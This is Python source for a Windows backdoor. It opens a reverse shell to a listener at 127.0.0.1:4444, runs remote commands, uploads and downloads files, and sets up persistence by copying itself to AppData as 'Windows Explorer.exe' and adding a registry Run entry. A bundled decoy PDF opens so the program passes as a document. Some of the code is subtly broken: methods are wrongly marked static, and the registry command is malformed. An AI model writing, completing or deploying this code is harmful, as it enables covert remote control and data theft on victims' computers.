# Imports
import socket
import subprocess
import json
import os
import sys
import shutil
import base64


# Backdoor Class
class Backdoor:
    # Constructor
    def __init__(self, ip, port):
        self.become_persistent()
        # Creating a Socket
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    @staticmethod
    # Making Persistent
    def become_persistent(self):
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call(
                'HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "' + evil_file_location
                + '"', shell=True)

    # Reliable Data Sending
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    # Reliable Data Receiving
    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    # Execute System Commands
    @staticmethod
    def execute_system_command(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    # Changing Current Working Directory
    @staticmethod
    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    # Reading a file
    @staticmethod
    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    # Writing to a File
    @staticmethod
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    # Run Function
    def run(self):
        while True:
            try:
                # Receiving Data
                command = self.reliable_receive()
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()

                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])

                elif command[0] == 'download':
                    command_result = self.read_file(command[1]).decode()

                elif command[0] == 'upload':
                    command_result = self.write_file(command[1], command[2])

                else:
                    command_result = self.execute_system_command(self, command).decode()

            except KeyboardInterrupt:
                command_result = "Terminating....."

            except Exception:
                command_result = "[-] Error during command execution."

            # Sending the Result
            self.reliable_send(command_result)


# Changing the executable location
file_name = sys._MEIPASS + '\sample.pdf'
subprocess.Popen(file_name)


# Run Backdoor
try:
    backdoor = Backdoor("127.0.0.1", 4444)
    backdoor.run()

except Exception:
    sys.exit()
